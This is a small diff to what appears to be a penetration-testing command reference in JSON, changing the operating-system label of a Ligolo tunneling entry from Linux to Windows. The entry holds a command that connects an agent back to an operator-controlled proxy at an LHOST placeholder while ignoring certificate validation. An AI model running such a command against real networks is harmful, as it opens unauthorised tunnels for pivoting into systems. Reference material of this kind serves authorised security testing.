@@ -94,7 +94,7 @@
   ],
   "tunneling_and_port_forwarding": [
     {
-      "os": "Linux",
+      "os": "Windows",
       "cmd": "./agent.exe -connect {LHOST}:11601 -ignore-cert",
       "description": "Connect a Ligolo agent to a Ligolo proxy server at a specified IP and local listening port, ignoring TLS certificate validation."
     },
